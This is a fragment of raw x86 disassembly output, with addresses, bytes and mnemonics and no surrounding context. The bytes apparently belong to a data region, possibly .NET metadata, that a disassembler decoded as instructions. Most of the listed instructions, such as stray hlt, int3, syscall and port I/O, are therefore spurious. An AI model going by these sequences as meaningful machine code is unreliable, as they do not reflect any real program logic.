  4069d1:	00 6d 1b             	add    %ch,0x1b(%ebp)
  4069d4:	00 00                	add    %al,(%eax)
  4069d6:	03 00                	add    (%eax),%eax
  4069d8:	34 05                	xor    $0x5,%al
  4069da:	00 00                	add    %al,(%eax)
  4069dc:	01 00                	add    %eax,(%eax)
  4069de:	f4                   	hlt
  4069df:	00 00                	add    %al,(%eax)
  4069e1:	00 02                	add    %al,(%edx)
  4069e3:	00 2b                	add    %ch,(%ebx)
  4069e5:	09 00                	or     %eax,(%eax)
  4069e7:	00 01                	add    %al,(%ecx)
  4069e9:	00 50 26             	add    %dl,0x26(%eax)
  4069ec:	00 00                	add    %al,(%eax)
  4069ee:	01 00                	add    %eax,(%eax)
  4069f0:	5b                   	pop    %ebx
  4069f1:	1f                   	pop    %ds
  4069f2:	00 00                	add    %al,(%eax)
  4069f4:	01 00                	add    %eax,(%eax)
  4069f6:	2b 24 00             	sub    (%eax,%eax,1),%esp
  4069f9:	00 01                	add    %al,(%ecx)
  4069fb:	00 1f                	add    %bl,(%edi)
  4069fd:	02 00                	add    (%eax),%al
  4069ff:	00 01                	add    %al,(%ecx)
  406a01:	00 14 02             	add    %dl,(%edx,%eax,1)
  406a04:	00 00                	add    %al,(%eax)
  406a06:	01 00                	add    %eax,(%eax)
  406a08:	42                   	inc    %edx
  406a09:	0a 00                	or     (%eax),%al
  406a0b:	00 01                	add    %al,(%ecx)
  406a0d:	00 4b 07             	add    %cl,0x7(%ebx)
  406a10:	00 00                	add    %al,(%eax)
  406a12:	01 00                	add    %eax,(%eax)
  406a14:	7e 16                	jle    0x406a2c
  406a16:	00 00                	add    %al,(%eax)
  406a18:	01 00                	add    %eax,(%eax)
  406a1a:	0a 18                	or     (%eax),%bl
  406a1c:	00 00                	add    %al,(%eax)
  406a1e:	01 00                	add    %eax,(%eax)
  406a20:	95                   	xchg   %eax,%ebp
  406a21:	01 00                	add    %eax,(%eax)
  406a23:	00 01                	add    %al,(%ecx)
  406a25:	00 e5                	add    %ah,%ch
  406a27:	08 00                	or     %al,(%eax)
  406a29:	00 02                	add    %al,(%edx)
  406a2b:	00 48 0b             	add    %cl,0xb(%eax)
  406a2e:	00 00                	add    %al,(%eax)
  406a30:	01 00                	add    %eax,(%eax)
  406a32:	1e                   	push   %ds
  406a33:	18 00                	sbb    %al,(%eax)
  406a35:	00 01                	add    %al,(%ecx)
  406a37:	00 7d 18             	add    %bh,0x18(%ebp)
  406a3a:	00 00                	add    %al,(%eax)
  406a3c:	01 00                	add    %eax,(%eax)
  406a3e:	71 05                	jno    0x406a45
  406a40:	00 00                	add    %al,(%eax)
  406a42:	01 00                	add    %eax,(%eax)
  406a44:	af                   	scas   %es:(%edi),%eax
  406a45:	02 06                	add    (%esi),%al
  406a47:	00 2d 00 08 00 35    	add    %ch,0x35000800
  406a4d:	00 59 00             	add    %bl,0x0(%ecx)
  406a50:	f6 21                	mulb   (%ecx)
  406a52:	04 01                	add    $0x1,%al
  406a54:	59                   	pop    %ecx
  406a55:	00 b9 22 08 01 59    	add    %bh,0x59010822(%ecx)
  406a5b:	00 0d 21 0e 00 69    	add    %cl,0x69000e21
  406a61:	00 1f                	add    %bl,(%edi)
  406a63:	1d b2 01 c9 00       	sbb    $0xc901b2,%eax
  406a68:	37                   	aaa
  406a69:	1d fa 02 d1 00       	sbb    $0xd102fa,%eax
  406a6e:	37                   	aaa
  406a6f:	1d 0e 00 d9 00       	sbb    $0xd9000e,%eax
  406a74:	37                   	aaa
  406a75:	1d 27 03 e9 00       	sbb    $0xe90327,%eax
  406a7a:	37                   	aaa
  406a7b:	1d 53 01 f1 00       	sbb    $0xf10153,%eax
  406a80:	37                   	aaa
  406a81:	1d 53 01 f9 00       	sbb    $0xf90153,%eax
  406a86:	37                   	aaa
  406a87:	1d 53 01 01 01       	sbb    $0x1010153,%eax
  406a8c:	37                   	aaa
  406a8d:	1d 53 01 09 01       	sbb    $0x1090153,%eax
  406a92:	37                   	aaa
  406a93:	1d 53 01 11 01       	sbb    $0x1110153,%eax
  406a98:	37                   	aaa
  406a99:	1d 53 01 19 01       	sbb    $0x1190153,%eax
  406a9e:	37                   	aaa
  406a9f:	1d 53 01 21 01       	sbb    $0x1210153,%eax
  406aa4:	37                   	aaa
  406aa5:	1d 99 01 29 01       	sbb    $0x1290199,%eax
  406aaa:	37                   	aaa
  406aab:	1d 53 01 31 01       	sbb    $0x1310153,%eax
  406ab0:	37                   	aaa
  406ab1:	1d 53 01 39 01       	sbb    $0x1390153,%eax
  406ab6:	37                   	aaa
  406ab7:	1d 0e 00 41 01       	sbb    $0x141000e,%eax
  406abc:	37                   	aaa
  406abd:	1d 53 01 49 01       	sbb    $0x1490153,%eax
  406ac2:	fc                   	cld
  406ac3:	1a 7f 00             	sbb    0x0(%edi),%bh
  406ac6:	51                   	push   %ecx
  406ac7:	01 44 00 bd          	add    %eax,-0x43(%eax,%eax,1)
  406acb:	03 59 01             	add    0x1(%ecx),%ebx
  406ace:	2f                   	das
  406acf:	21 7f 00             	and    %edi,0x0(%edi)
  406ad2:	51                   	push   %ecx
  406ad3:	01 73 18             	add    %esi,0x18(%ebx)
  406ad6:	84 00                	test   %al,(%eax)
  406ad8:	61                   	popa
  406ad9:	01 37                	add    %esi,(%edi)
  406adb:	1d 0e 00 61 01       	sbb    $0x161000e,%eax
  406ae0:	bd 22 c2 03 09       	mov    $0x903c222,%ebp
  406ae5:	00 37                	add    %dh,(%edi)
  406ae7:	1d 0e 00 69 01       	sbb    $0x169000e,%eax
  406aec:	8a 00                	mov    (%eax),%al
  406aee:	cc                   	int3
  406aef:	03 51 01             	add    0x1(%ecx),%edx
  406af2:	f2 13 c7             	repnz adc %edi,%eax
  406af5:	00 69 01             	add    %ch,0x1(%ecx)
  406af8:	44                   	inc    %esp
  406af9:	14 d2                	adc    $0xd2,%al
  406afb:	03 11                	add    (%ecx),%edx
  406afd:	00 37                	add    %dh,(%edi)
  406aff:	1d 79 01 11 00       	sbb    $0x110179,%eax
  406b04:	f8                   	clc
  406b05:	24 d8                	and    $0xd8,%al
  406b07:	03 71 01             	add    0x1(%ecx),%esi
  406b0a:	d0 24 de             	shlb   $1,(%esi,%ebx,8)
  406b0d:	03 69 01             	add    0x1(%ecx),%ebp
  406b10:	ce                   	into
  406b11:	1e                   	push   %ds
  406b12:	e4 03                	in     $0x3,%al
  406b14:	89 01                	mov    %eax,(%ecx)
  406b16:	6d                   	insl   (%dx),%es:(%edi)
  406b17:	01 6b 02             	add    %ebp,0x2(%ebx)
  406b1a:	81 01 db 14 ea 03    	addl   $0x3ea14db,(%ecx)
  406b20:	19 00                	sbb    %eax,(%eax)
  406b22:	37                   	aaa
  406b23:	1d 08 04 19 00       	sbb    $0x190408,%eax
  406b28:	a1 12 fa 02 19       	mov    0x1902fa12,%eax
  406b2d:	00 8e 12 fa 02 c9    	add    %cl,-0x36fd05ee(%esi)
  406b33:	01 76 25             	add    %esi,0x25(%esi)
  406b36:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406b37:	02 c9                	add    %cl,%cl
  406b39:	01 29                	add    %ebp,(%ecx)
  406b3b:	21 15 04 61 01 bd    	and    %edx,0xbd016104
  406b41:	22 1c 04             	and    (%esp,%eax,1),%bl
  406b44:	d9 01                	flds   (%ecx)
  406b46:	6f                   	outsl  %ds:(%esi),(%dx)
  406b47:	1e                   	push   %ds
  406b48:	21 04 19             	and    %eax,(%ecx,%ebx,1)
  406b4b:	00 bb 20 29 04 19    	add    %bh,0x19042920(%ebx)
  406b51:	00 d6                	add    %dl,%dh
  406b53:	0b 08                	or     (%eax),%ecx
  406b55:	01 19                	add    %ebx,(%ecx)
  406b57:	00 bb 20 8a 01 a1    	add    %bh,-0x5efe75e0(%ebx)
  406b5d:	01 37                	add    %esi,(%edi)
  406b5f:	1d 0e 00 a9 01       	sbb    $0x1a9000e,%eax
  406b64:	37                   	aaa
  406b65:	1d 84 01 a1 01       	sbb    $0x1a10184,%eax
  406b6a:	37                   	aaa
  406b6b:	1f                   	pop    %ds
  406b6c:	31 04 a1             	xor    %eax,(%ecx,%eiz,4)
  406b6f:	01 12                	add    %edx,(%edx)
  406b71:	14 de                	adc    $0xde,%al
  406b73:	02 c9                	add    %cl,%cl
  406b75:	01 29                	add    %ebp,(%ecx)
  406b77:	21 38                	and    %edi,(%eax)
  406b79:	04 f1                	add    $0xf1,%al
  406b7b:	01 05 10 0e 00 f9    	add    %eax,0xf9000e10
  406b81:	01 37                	add    %esi,(%edi)
  406b83:	1d 42 04 01 02       	sbb    $0x2010442,%eax
  406b88:	37                   	aaa
  406b89:	1d 49 04 21 00       	sbb    $0x210449,%eax
  406b8e:	37                   	aaa
  406b8f:	1d 4f 04 19 00       	sbb    $0x19044f,%eax
  406b94:	28 22                	sub    %ah,(%edx)
  406b96:	59                   	pop    %ecx
  406b97:	04 09                	add    $0x9,%al
  406b99:	00 21                	add    %ah,(%ecx)
  406b9b:	14 95                	adc    $0x95,%al
  406b9d:	01 21                	add    %esp,(%ecx)
  406b9f:	00 a4 21 5f 04 29 02 	add    %ah,0x229045f(%ecx,%eiz,1)
  406ba6:	37                   	aaa
  406ba7:	1d 49 04 29 00       	sbb    $0x290449,%eax
  406bac:	37                   	aaa
  406bad:	1d 6b 04 31 02       	sbb    $0x231046b,%eax
  406bb2:	37                   	aaa
  406bb3:	1d 49 04 71 00       	sbb    $0x710449,%eax
  406bb8:	ae                   	scas   %es:(%edi),%al
  406bb9:	0b 75 04             	or     0x4(%ebp),%esi
  406bbc:	39 02                	cmp    %eax,(%edx)
  406bbe:	60                   	pusha
  406bbf:	0f 82 04 31 00 47    	jb     0x47409cc9
  406bc5:	1f                   	pop    %ds
  406bc6:	89 04 29             	mov    %eax,(%ecx,%ebp,1)
  406bc9:	00 05 10 0e 00 71    	add    %al,0x71000e10
  406bcf:	00 05 10 0e 00 19    	add    %al,0x19000e10
  406bd5:	00 05 10 0e 00 71    	add    %al,0x71000e10
  406bdb:	00 a6 0b 94 04 49    	add    %ah,0x4904940b(%esi)
  406be1:	02 44 00 9a          	add    -0x66(%eax,%eax,1),%al
  406be5:	04 71                	add    $0x71,%al
  406be7:	00 b3 0b a1 04 51    	add    %dh,0x5104a10b(%ebx)
  406bed:	02 37                	add    (%edi),%dh
  406bef:	1d 49 04 49 01       	sbb    $0x1490449,%eax
  406bf4:	37                   	aaa
  406bf5:	1d a9 04 49 01       	sbb    $0x14904a9,%eax
  406bfa:	77 22                	ja     0x406c1e
  406bfc:	b0 04                	mov    $0x4,%al
  406bfe:	61                   	popa
  406bff:	02 be 1c c2 04 49    	add    0x4904c21c(%esi),%bh
  406c05:	02 ce                	add    %dh,%cl
  406c07:	1e                   	push   %ds
  406c08:	e0 00                	loopne 0x406c0a
  406c0a:	19 00                	sbb    %eax,(%eax)
  406c0c:	29 17                	sub    %edx,(%edi)
  406c0e:	c9                   	leave
  406c0f:	04 71                	add    $0x71,%al
  406c11:	00 5d 10             	add    %bl,0x10(%ebp)
  406c14:	d1 04 59             	roll   $1,(%ecx,%ebx,2)
  406c17:	02 37                	add    (%edi),%dh
  406c19:	1d 79 01 71 00       	sbb    $0x710179,%eax
  406c1e:	6e                   	outsb  %ds:(%esi),(%dx)
  406c1f:	19 63 01             	sbb    %esp,0x1(%ebx)
  406c22:	71 00                	jno    0x406c24
  406c24:	e6 14                	out    %al,$0x14
  406c26:	0e                   	push   %cs
  406c27:	00 61 02             	add    %ah,0x2(%ecx)
  406c2a:	2f                   	das
  406c2b:	21 9a 00 c9 01 73    	and    %ebx,0x7301c900(%edx)
  406c31:	20 d9                	and    %bl,%cl
  406c33:	04 71                	add    $0x71,%al
  406c35:	02 b3 20 0a 00 79    	add    0x79000a20(%ebx),%dh
  406c3b:	02 37                	add    (%edi),%dh
  406c3d:	1d 0e 00 c9 01       	sbb    $0x1c9000e,%eax
  406c42:	7f 20                	jg     0x406c64
  406c44:	e9 04 79 02 11       	jmp    0x1142e54d
  406c49:	0d ef 04 49 02       	or     $0x24904ef,%eax
  406c4e:	ce                   	into
  406c4f:	1e                   	push   %ds
  406c50:	da 00                	fiaddl (%eax)
  406c52:	49                   	dec    %ecx
  406c53:	02 ce                	add    %dh,%cl
  406c55:	1e                   	push   %ds
  406c56:	ec                   	in     (%dx),%al
  406c57:	00 51 00             	add    %dl,0x0(%ecx)
  406c5a:	37                   	aaa
  406c5b:	1d 0e 00 0c 00       	sbb    $0xc000e,%eax
  406c60:	85 17                	test   %edx,(%edi)
  406c62:	04 05                	add    $0x5,%al
  406c64:	0c 00                	or     $0x0,%al
  406c66:	3b 22                	cmp    (%edx),%esp
  406c68:	3d 01 c9 01 d1       	cmp    $0xd101c901,%eax
  406c6d:	1c 95                	sbb    $0x95,%al
  406c6f:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  406c72:	7d 1b                	jge    0x406c8f
  406c74:	0e                   	push   %cs
  406c75:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406c78:	c4 0b                	les    (%ebx),%ecx
  406c7a:	0f 05                	syscall
  406c7c:	0c 00                	or     $0x0,%al
  406c7e:	1f                   	pop    %ds
  406c7f:	1d 24 05 14 00       	sbb    $0x140524,%eax
  406c84:	f6 21                	mulb   (%ecx)
  406c86:	36 05 c9 01 47 1f    	ss add $0x1f4701c9,%eax
  406c8c:	90                   	nop
  406c8d:	01 14 00             	add    %edx,(%eax,%eax,1)
  406c90:	b9 22 08 01 71       	mov    $0x71010822,%ecx
  406c95:	00 09                	add    %cl,(%ecx)
  406c97:	12 43 05             	adc    0x5(%ebx),%al
  406c9a:	49                   	dec    %ecx
  406c9b:	02 ce                	add    %dh,%cl
  406c9d:	1e                   	push   %ds
  406c9e:	e6 00                	out    %al,$0x0
  406ca0:	51                   	push   %ecx
  406ca1:	01 5d 00             	add    %ebx,0x0(%ebp)
  406ca4:	4d                   	dec    %ebp
  406ca5:	05 c9 01 de 17       	add    $0x17de01c9,%eax
  406caa:	95                   	xchg   %eax,%ebp
  406cab:	01 91 02 0d 10 52    	add    %edx,0x52100d02(%ecx)
  406cb1:	05 51 01 5d 00       	add    $0x5d0151,%eax
  406cb6:	57                   	push   %edi
  406cb7:	05 51 01 5d 00       	add    $0x5d0151,%eax
  406cbc:	5c                   	pop    %esp
  406cbd:	05 51 01 5d 00       	add    $0x5d0151,%eax
  406cc2:	61                   	popa
  406cc3:	05 51 01 66 00       	add    $0x660151,%eax
  406cc8:	68 05 89 02 0d       	push   $0xd028905
  406ccd:	10 6d 05             	adc    %ch,0x5(%ebp)
  406cd0:	51                   	push   %ecx
  406cd1:	01 66 00             	add    %esp,0x0(%esi)
  406cd4:	72 05                	jb     0x406cdb
  406cd6:	51                   	push   %ecx
  406cd7:	01 66 00             	add    %esp,0x0(%esi)
  406cda:	77 05                	ja     0x406ce1
  406cdc:	51                   	push   %ecx
  406cdd:	01 66 00             	add    %esp,0x0(%esi)
  406ce0:	7c 05                	jl     0x406ce7
  406ce2:	51                   	push   %ecx
  406ce3:	01 21                	add    %esp,(%ecx)
  406ce5:	0e                   	push   %cs
  406ce6:	83 05 99 02 0d 10 88 	addl   $0xffffff88,0x100d0299
  406ced:	05 49 02 ce 1e       	add    $0x1ece0249,%eax
  406cf2:	95                   	xchg   %eax,%ebp
  406cf3:	05 a9 02 50 25       	add    $0x255002a9,%eax
  406cf8:	71 01                	jno    0x406cfb
  406cfa:	b9 02 36 20 84       	mov    $0x84203602,%ecx
  406cff:	00 b1 02 37 1d a6    	add    %dh,-0x59e2c8fe(%ecx)
  406d05:	05 71 00 0b 15       	add    $0x150b0071,%eax
  406d0a:	71 01                	jno    0x406d0d
  406d0c:	71 00                	jno    0x406d0e
  406d0e:	ff 0f                	decl   (%edi)
  406d10:	0e                   	push   %cs
  406d11:	00 b1 02 37 1d b4    	add    %dh,-0x4be2c8fe(%ecx)
  406d17:	05 d9 02 ac 24       	add    $0x24ac02d9,%eax
  406d1c:	c8 05 59 02          	enter  $0x5905,$0x2
  406d20:	37                   	aaa
  406d21:	1d 0e 00 71 00       	sbb    $0x71000e,%eax
  406d26:	00 12                	add    %dl,(%edx)
  406d28:	3d 01 91 01 37       	cmp    $0x37019101,%eax
  406d2d:	1d 53 01 49 02       	sbb    $0x2490153,%eax
  406d32:	6e                   	outsb  %ds:(%esi),(%dx)
  406d33:	00 de                	add    %bl,%dh
  406d35:	05 49 02 87 0e       	add    $0xe870249,%eax
  406d3a:	e5 05                	in     $0x5,%eax
  406d3c:	49                   	dec    %ecx
  406d3d:	02 21                	add    (%ecx),%ah
  406d3f:	0e                   	push   %cs
  406d40:	ec                   	in     (%dx),%al
  406d41:	05 49 02 3b 00       	add    $0x3b0249,%eax
  406d46:	f3 05 49 02 5d 00    	repz add $0x5d0249,%eax
  406d4c:	fa                   	cli
  406d4d:	05 49 02 77 00       	add    $0x770249,%eax
  406d52:	01 06                	add    %eax,(%esi)
  406d54:	49                   	dec    %ecx
  406d55:	02 66 00             	add    0x0(%esi),%ah
  406d58:	08 06                	or     %al,(%esi)
  406d5a:	0c 00                	or     $0x0,%al
  406d5c:	37                   	aaa
  406d5d:	1d 0e 00 49 02       	sbb    $0x249000e,%eax
  406d62:	ce                   	into
  406d63:	1e                   	push   %ds
  406d64:	3a 06                	cmp    (%esi),%al
  406d66:	59                   	pop    %ecx
  406d67:	01 47 1e             	add    %eax,0x1e(%edi)
  406d6a:	6b 02 19             	imul   $0x19,(%edx),%eax
  406d6d:	03 a3 0f d9 04 f9    	add    -0x6fb26f1(%ebx),%esp
  406d73:	02 37                	add    (%edi),%dh
  406d75:	1d 53 01 81 00       	sbb    $0x810153,%eax
  406d7a:	ec                   	in     (%dx),%al
  406d7b:	1f                   	pop    %ds
  406d7c:	5d                   	pop    %ebp
  406d7d:	06                   	push   %es
  406d7e:	81 00 b1 0e 62 06    	addl   $0x6620eb1,(%eax)
  406d84:	21 03                	and    %eax,(%ebx)
  406d86:	f1                   	int1
  406d87:	0e                   	push   %cs
  406d88:	95                   	xchg   %eax,%ebp
  406d89:	01 29                	add    %ebp,(%ecx)
  406d8b:	03 46 0f             	add    0xf(%esi),%eax
  406d8e:	95                   	xchg   %eax,%ebp
  406d8f:	01 c9                	add    %ecx,%ecx
  406d91:	01 82 25 a5 02 81    	add    %eax,-0x7efd5adb(%edx)
  406d97:	00 62 1e             	add    %ah,0x1e(%edx)
  406d9a:	68 06 81 00 24       	push   $0x24008106
  406d9f:	17                   	pop    %ss
  406da0:	0e                   	push   %cs
  406da1:	00 81 00 37 1d 0e    	add    %al,0xe1d3700(%ecx)
  406da7:	00 01                	add    %al,(%ecx)
  406da9:	03 37                	add    (%edi),%esi
  406dab:	1d 0e 00 01 03       	sbb    $0x301000e,%eax
  406db0:	fe 0e                	decb   (%esi)
  406db2:	53                   	push   %ebx
  406db3:	01 19                	add    %ebx,(%ecx)
  406db5:	03 bc 18 6b 02 c9 01 	add    0x1c9026b(%eax,%ebx,1),%edi
  406dbc:	73 20                	jae    0x406dde
  406dbe:	6e                   	outsb  %ds:(%esi),(%dx)
  406dbf:	06                   	push   %es
  406dc0:	01 03                	add    %eax,(%ebx)
  406dc2:	1b 20                	sbb    (%eax),%esp
  406dc4:	53                   	push   %ebx
  406dc5:	01 01                	add    %eax,(%ecx)
  406dc7:	03 ce                	add    %esi,%ecx
  406dc9:	0e                   	push   %cs
  406dca:	74 06                	je     0x406dd2
  406dcc:	01 03                	add    %eax,(%ebx)
  406dce:	b2 23                	mov    $0x23,%dl
  406dd0:	99                   	cltd
  406dd1:	01 81 00 53 1a 7b    	add    %eax,0x7b1a5300(%ecx)
  406dd7:	06                   	push   %es
  406dd8:	81 00 77 22 08 01    	addl   $0x1082277,(%eax)
  406dde:	39 03                	cmp    %eax,(%ebx)
  406de0:	9a 1c 82 06 41 03 13 	lcall  $0x1303,$0x4106821c
  406de7:	10 6b 02             	adc    %ch,0x2(%ebx)
  406dea:	09 03                	or     %eax,(%ebx)
  406dec:	ed                   	in     (%dx),%eax
  406ded:	24 87                	and    $0x87,%al
  406def:	06                   	push   %es
  406df0:	c9                   	leave
  406df1:	01 73 20             	add    %esi,0x20(%ebx)
  406df4:	91                   	xchg   %eax,%ecx
  406df5:	06                   	push   %es
  406df6:	09 03                	or     %eax,(%ebx)
  406df8:	28 12                	sub    %dl,(%edx)
  406dfa:	98                   	cwtl
  406dfb:	06                   	push   %es
  406dfc:	b9 02 4d 10 b1       	mov    $0xb1104d02,%ecx
  406e01:	02 b9 02 c1 1e c7    	add    -0x38e13efe(%ecx),%bh
  406e07:	00 61 01             	add    %ah,0x1(%ecx)
  406e0a:	d7                   	xlat   %ds:(%ebx)
  406e0b:	1e                   	push   %ds
  406e0c:	79 01                	jns    0x406e0f
  406e0e:	19 03                	sbb    %eax,(%ebx)
  406e10:	0b 0f                	or     (%edi),%ecx
  406e12:	67 02 11             	add    (%bx,%di),%dl
  406e15:	03 37                	add    (%edi),%esi
  406e17:	1d 53 01 51 03       	sbb    $0x3510153,%eax
  406e1c:	99                   	cltd
  406e1d:	0f 53 01             	rcpps  (%ecx),%xmm0
  406e20:	19 03                	sbb    %eax,(%ebx)
  406e22:	ff 14 67             	call   *(%edi,%eiz,2)
  406e25:	02 19                	add    (%ecx),%bl
  406e27:	03 1b                	add    (%ebx),%ebx
  406e29:	0f 6b 02             	packssdw (%edx),%mm0
  406e2c:	01 03                	add    %eax,(%ebx)
  406e2e:	67 14 99             	addr16 adc $0x99,%al
  406e31:	01 01                	add    %eax,(%ecx)
  406e33:	03 ec                	add    %esp,%ebp
  406e35:	11 99 01 81 00 77    	adc    %ebx,0x77008101(%ecx)
  406e3b:	22 9e 06 59 01 8a    	and    -0x75fea6fa(%esi),%bl
  406e41:	22 b1 02 59 01 59    	and    0x59015902(%ecx),%dh
  406e47:	25 67 02 19 03       	and    $0x3190267,%eax
  406e4c:	58                   	pop    %eax
  406e4d:	22 6b 02             	and    0x2(%ebx),%ch
  406e50:	59                   	pop    %ecx
  406e51:	03 37                	add    (%edi),%esi
  406e53:	1d 53 01 59 03       	sbb    $0x3590153,%eax
  406e58:	62 12                	bound  %edx,(%edx)
  406e5a:	71 01                	jno    0x406e5d
  406e5c:	61                   	popa
  406e5d:	03 37                	add    (%edi),%esi
  406e5f:	1d 0e 00 61 03       	sbb    $0x361000e,%eax
  406e64:	37                   	aaa
  406e65:	0f 95 01             	setne  (%ecx)
  406e68:	c9                   	leave
  406e69:	01 82 1f 90 01 69    	add    %eax,0x6901901f(%edx)
  406e6f:	03 37                	add    (%edi),%esi
  406e71:	1d 53 01 69 03       	sbb    $0x3690153,%eax
  406e76:	c3                   	ret
  406e77:	20 bc 06 71 03 1f 1d 	and    %bh,0x1d1f0371(%esi,%eax,1)
  406e7e:	c2 06 79             	ret    $0x7906
  406e81:	03 f6                	add    %esi,%esi
  406e83:	21 c8                	and    %ecx,%eax
  406e85:	06                   	push   %es
  406e86:	81 03 85 17 ce 06    	addl   $0x6ce1785,(%ebx)
  406e8c:	c9                   	leave
  406e8d:	01 51 21             	add    %edx,0x21(%ecx)
  406e90:	95                   	xchg   %eax,%ebp
  406e91:	01 79 03             	add    %edi,0x3(%ecx)
  406e94:	b9 22 08 01 81       	mov    $0x81010822,%ecx
  406e99:	00 2a                	add    %ch,(%edx)
  406e9b:	0e                   	push   %cs
  406e9c:	d8 06                	fadds  (%esi)
  406e9e:	89 03                	mov    %eax,(%ebx)
  406ea0:	44                   	inc    %esp
  406ea1:	00 3d 01 81 00 80    	add    %bh,0x80008101
  406ea7:	0b 3d 01 91 03 21    	or     0x21039101,%edi
  406ead:	14 95                	adc    $0x95,%al
  406eaf:	01 99 03 85 22 f6    	add    %ebx,-0x9dd7afd(%ecx)
  406eb5:	06                   	push   %es
  406eb6:	99                   	cltd
  406eb7:	03 34 21             	add    (%ecx,%eiz,1),%esi
  406eba:	09 07                	or     %eax,(%edi)
  406ebc:	59                   	pop    %ecx
  406ebd:	01 45 22             	add    %eax,0x22(%ebp)
  406ec0:	7b 00                	jnp    0x406ec2
  406ec2:	59                   	pop    %ecx
  406ec3:	01 53 0f             	add    %edx,0xf(%ebx)
  406ec6:	67 02 59 01          	add    0x1(%bx,%di),%bl
  406eca:	27                   	daa
  406ecb:	0f 67 02             	packuswb (%edx),%mm0
  406ece:	59                   	pop    %ecx
  406ecf:	01 d8                	add    %ebx,%eax
  406ed1:	18 1a                	sbb    %bl,(%edx)
  406ed3:	07                   	pop    %es
  406ed4:	c9                   	leave
  406ed5:	01 73 20             	add    %esi,0x20(%ebx)
  406ed8:	20 07                	and    %al,(%edi)
  406eda:	b1 03                	mov    $0x3,%cl
  406edc:	37                   	aaa
  406edd:	1d 0e 00 69 01       	sbb    $0x169000e,%eax
  406ee2:	95                   	xchg   %eax,%ebp
  406ee3:	03 cc                	add    %esp,%ecx
  406ee5:	03 b9 03 cf 14 e3    	add    -0x1ceb30fd(%ecx),%edi
  406eeb:	02 21                	add    (%ecx),%ah
  406eed:	02 21                	add    (%ecx),%ah
  406eef:	14 de                	adc    $0xde,%al
  406ef1:	02 c9                	add    %cl,%cl
  406ef3:	01 4e 14             	add    %ecx,0x14(%esi)
  406ef6:	32 07                	xor    (%edi),%al
  406ef8:	c9                   	leave
  406ef9:	01 92 1c 95 01 c9    	add    %edx,-0x36fe6ae4(%edx)
  406eff:	01 6a 0d             	add    %ebp,0xd(%edx)
  406f02:	3f                   	aas
  406f03:	07                   	pop    %es
  406f04:	59                   	pop    %ecx
  406f05:	01 8e 17 1d 00 f1    	add    %ecx,-0xeffe2e9(%esi)
  406f0b:	02 21                	add    (%ecx),%ah
  406f0d:	14 95                	adc    $0x95,%al
  406f0f:	01 c1                	add    %eax,%ecx
  406f11:	03 ec                	add    %esp,%ebp
  406f13:	14 67                	adc    $0x67,%al
  406f15:	02 29                	add    (%ecx),%ch
  406f17:	03 77 0f             	add    0xf(%edi),%esi
  406f1a:	45                   	inc    %ebp
  406f1b:	07                   	pop    %es
  406f1c:	a9 02 89 0f 45       	test   $0x450f8902,%eax
  406f21:	07                   	pop    %es
  406f22:	a9 02 21 14 95       	test   $0x95142102,%eax
  406f27:	01 c9                	add    %ecx,%ecx
  406f29:	03 02                	add    (%edx),%eax
  406f2b:	22 4b 07             	and    0x7(%ebx),%cl
  406f2e:	d1 03                	roll   $1,(%ebx)
  406f30:	37                   	aaa
  406f31:	1d 51 07 d1 03       	sbb    $0x3d10751,%eax
  406f36:	95                   	xchg   %eax,%ebp
  406f37:	0e                   	push   %cs
  406f38:	58                   	pop    %eax
  406f39:	07                   	pop    %es
  406f3a:	19 00                	sbb    %eax,(%eax)
  406f3c:	ff 0f                	decl   (%edi)
  406f3e:	0e                   	push   %cs
  406f3f:	00 69 03             	add    %ch,0x3(%ecx)
  406f42:	37                   	aaa
  406f43:	1d 84 01 24 00       	sbb    $0x240184,%eax
  406f48:	37                   	aaa
  406f49:	1d 0e 00 24 00       	sbb    $0x24000e,%eax
  406f4e:	c4 0b                	les    (%ebx),%ecx
  406f50:	0f 05                	syscall
  406f52:	24 00                	and    $0x0,%al
  406f54:	3b 22                	cmp    (%edx),%esp
  406f56:	3d 01 24 00 bc       	cmp    $0xbc002401,%eax
  406f5b:	24 77                	and    $0x77,%al
  406f5d:	07                   	pop    %es
  406f5e:	c9                   	leave
  406f5f:	01 b7 18 7d 07 89    	add    %esi,-0x76f882e8(%edi)
  406f65:	00 b1 1f 8d 07 89    	add    %dh,-0x76f872e1(%ecx)
  406f6b:	00 7a 01             	add    %bh,0x1(%edx)
  406f6e:	93                   	xchg   %eax,%ebx
  406f6f:	07                   	pop    %es
  406f70:	91                   	xchg   %eax,%ecx
  406f71:	00 04 0c             	add    %al,(%esp,%ecx,1)
  406f74:	93                   	xchg   %eax,%ebx
  406f75:	07                   	pop    %es
  406f76:	e1 03                	loope  0x406f7b
  406f78:	76 25                	jbe    0x406f9f
  406f7a:	99                   	cltd
  406f7b:	07                   	pop    %es
  406f7c:	99                   	cltd
  406f7d:	00 37                	add    %dh,(%edi)
  406f7f:	1d a3 07 e9 03       	sbb    $0x3e907a3,%eax
  406f84:	ff 0f                	decl   (%edi)
  406f86:	0e                   	push   %cs
  406f87:	00 f1                	add    %dh,%cl
  406f89:	03 37                	add    (%edi),%esi
  406f8b:	1d 49 04 f9 03       	sbb    $0x3f90449,%eax
  406f90:	a2 13 ab 07 81       	mov    %al,0x8107ab13
  406f95:	00 9f 0d 0a 00 09    	add    %bl,0x9000a0d(%edi)
  406f9b:	03 e0                	add    %eax,%esp
  406f9d:	24 87                	and    $0x87,%al
  406f9f:	06                   	push   %es
  406fa0:	09 03                	or     %eax,(%ebx)
  406fa2:	28 12                	sub    %dl,(%edx)
  406fa4:	b9 07 91 01 f6       	mov    $0xf6019107,%ecx
  406fa9:	0d 95 01 09 03       	or     $0x3090195,%eax
  406fae:	e0 24                	loopne 0x406fd4
  406fb0:	c9                   	leave
  406fb1:	07                   	pop    %es
  406fb2:	09 03                	or     %eax,(%ebx)
  406fb4:	1f                   	pop    %ds
  406fb5:	12 ce                	adc    %dh,%cl
  406fb7:	06                   	push   %es
  406fb8:	09 03                	or     %eax,(%ebx)
  406fba:	13 12                	adc    (%edx),%edx
  406fbc:	53                   	push   %ebx
  406fbd:	01 09                	add    %ecx,(%ecx)
  406fbf:	03 ed                	add    %ebp,%ebp
  406fc1:	24 d0                	and    $0xd0,%al
  406fc3:	07                   	pop    %es
  406fc4:	09 03                	or     %eax,(%ebx)
  406fc6:	e5 0d                	in     $0xd,%eax
  406fc8:	53                   	push   %ebx
  406fc9:	01 99 03 93 22 eb    	add    %ebx,-0x14dd6cfd(%ecx)
  406fcf:	07                   	pop    %es
  406fd0:	0c 00                	or     $0x0,%al
